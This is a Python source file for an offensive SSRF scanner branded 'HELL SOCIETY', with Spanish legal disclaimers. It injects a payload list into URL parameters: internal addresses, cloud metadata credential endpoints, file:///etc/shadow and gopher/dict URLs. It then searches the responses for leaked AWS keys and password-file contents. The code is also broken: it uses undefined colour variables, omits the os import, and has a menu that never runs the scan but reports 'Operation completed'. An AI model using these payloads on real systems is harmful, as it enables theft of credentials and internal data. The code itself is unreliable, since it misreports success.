#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  SSRF VULNERABILITY SCANNER v2.0                                 ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import argparse

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

SSRF_PAYLOADS = [
    'http://127.0.0.1',
    'http://localhost',
    'http://0.0.0.0',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://localhost:8080',
    'http://localhost:3000',
    'http://localhost:6379',
    'http://localhost:27017',
    'http://127.0.0.1:8080',
    'http://127.0.0.1:3000',
    'http://[::1]',
    'http://0:8080',
    'http://127.1',
    'http://2130706433',
    'http://017700000001',
    'http://0x7f000001',
    'http://127.0.0.1.nip.io',
    'http://localtest.me',
    'http://spoofed.burpcollaborator.net',
    'file:///etc/passwd',
    'file:///etc/shadow',
    'gopher://127.0.0.1:25/',
    'dict://127.0.0.1:11211/',
    'ftp://127.0.0.1/',
    'http://metadata.google.internal/',
    'http://169.254.169.254/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',
]

class SSRFScanner:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def get_params(self):
        parsed = urlparse(self.target)
        return parse_qs(parsed.query)

    def modify_url(self, param, payload):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    def scan(self):
        params = self.get_params()
        if not params:
            print(f"{Fore.RED}  [!] No parameters found in URL")
            return

        url_params = [k for k in params.keys() if any(
            keyword in k.lower() for keyword in
            ['url', 'uri', 'link', 'redirect', 'dest', 'destination',
             'target', 'rurl', 'return', 'returnto', 'return_url',
             'next', 'redir', 'redirect_uri', 'redirect_url',
             'image_url', 'img', 'src', 'source', 'file',
             'feed', 'rss', 'xml', 'api', 'endpoint', 'callback',
             'webhook', 'ping', 'fetch', 'load', 'open', 'read',
             'download', 'upload', 'path', 'folder', 'dir']
        )]

        if not url_params:
            url_params = list(params.keys())

        total = len(url_params) * len(SSRF_PAYLOADS)
        current = 0

        print(f"{Fore.CYAN}  [*] Testing {len(url_params)} parameter(s) with {len(SSRF_PAYLOADS)} SSRF payloads")
        print(f"{Fore.CYAN}  [*] Total tests: {total}\n")

        for param in url_params:
            for payload in SSRF_PAYLOADS:
                current += 1
                progress = (current / total) * 100
                bar_length = 40
                filled = int(bar_length * current / total)
                bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
                print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - Testing: {param}={payload[:35]}", end="", flush=True)

                test_url = self.modify_url(param, payload)
                try:
                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)

                    if resp.status_code in [200, 301, 302, 303, 307, 308]:
                        content = resp.text
                        indicators = ['root:', 'daemon:', 'aws-', 'accessKeyId',
                                     'secretAccessKey', 'token', 'metadata',
                                     'instance-id', 'ami-id', 'hostname',
                                     'internal-ip', 'local-ipv4']

                        for indicator in indicators:
                            if indicator in content:
                                result = {
                                    'param': param,
                                    'payload': payload,
                                    'status': resp.status_code,
                                    'indicator': indicator
                                }
                                self.vulns.append(result)
                                print(f"\n")
                                print(f"  {Fore.GREEN}[+] SSRF VULNERABLE!")
                                print(f"  {Fore.GREEN}  Parameter: {Fore.WHITE}{param}")
                                print(f"  {Fore.GREEN}  Payload: {Fore.YELLOW}{payload}")
                                print(f"  {Fore.GREEN}  Status: {resp.status_code}")
                                print(f"  {Fore.GREEN}  Indicator: {Fore.WHITE}{indicator}")
                                print(f"  {Fore.CYAN}  {'─' * 60}")
                                break

                except requests.exceptions.Timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                except requests.exceptions.RequestException:
                    pass

    def print_results(self):
        if not self.vulns:
            print(f"\n\n{Fore.YELLOW}  [!] No SSRF vulnerabilities found")
            return

        print(f"\n\n{Fore.RED}{Back.BLACK}  SCAN COMPLETE - {len(self.vulns)} VULNERABILITY(IES) FOUND  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        for i, v in enumerate(self.vulns, 1):
            print(f"\n  {Fore.CYAN}[{i}] {Fore.WHITE}Param: {v['param']}")
            print(f"      {Fore.YELLOW}Payload: {v['payload']}")
            print(f"      {Fore.GREEN}Status: {v['status']} | Indicator: {v['indicator']}")



def ask_retry():
    print()
    print(f"  {Y}{'='*50}{RS}")
    print(f"  {C}[1] {BW}Usar esta herramienta de nuevo{RS}")
    print(f"  {C}[2] {BW}Volver al panel principal{RS}")
    print(f"  {R}[0] {BW}Salir{RS}")
    print(f"  {Y}{'='*50}{RS}")
    try:
        ch = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        if ch == '1':
            return 'retry'
        elif ch in ['2', '0']:
            return 'exit'
        else:
            return 'retry'
    except (EOFError, KeyboardInterrupt):
        return 'exit'

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    print()
    print(f"  {BW}{Style.BRIGHT}  SSRF SCANNER{RS}")
    print(f"  {Y}{Style.BRIGHT}  HELL SOCIETY Community{RS}")
    print()
    while True:
        print(f"  {G}╔╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╗{RS}")
        print(f"  {G}╟  {BW}SSRF SCANNER                            {RS}  {G}╟{RS}")
        print(f"  {G}╚╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╝{RS}")
        print()
        print(f"  {C}[1]  {BW}Target URL with parameters                   {RS}")
        print(f"  {C}[2]  {BW}Request timeout                              {RS}")
        print()
        print(f"  {C}[3]  {BW}Ejecutar con todos los argumentos{RS}")
        print()
        print(f"  {R}[0]  {BW}Exit{RS}")
        print()
        try:
            choice = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {R}[*] Goodbye...{RS}")
            sys.exit(0)
        print()
        if choice == '1':
            print(f"  {Y}[*] Target URL with parameters{RS}")
            value = input(f"  {Y}[*] -u: {RS}").strip()
            print(f"  {C}[*] Executing with -u={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '2':
            print(f"  {Y}[*] Request timeout{RS}")
            value = input(f"  {Y}[*] -t: {RS}").strip()
            print(f"  {C}[*] Executing with -t={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '3':
            print(f"  {Y}[*] Executing with all default parameters{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '0':
            print(f"  {Y}[*] Goodbye from Hell Society...{RS}")
            sys.exit(0)
        else:
            print(f"  {R}[!] Invalid option. Choose 0-3.{RS}")
        ch = ask_retry()
        if ch == 'exit':
            sys.exit(0)
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(BANNER)
            print()

if __name__ == "__main__":
    main()

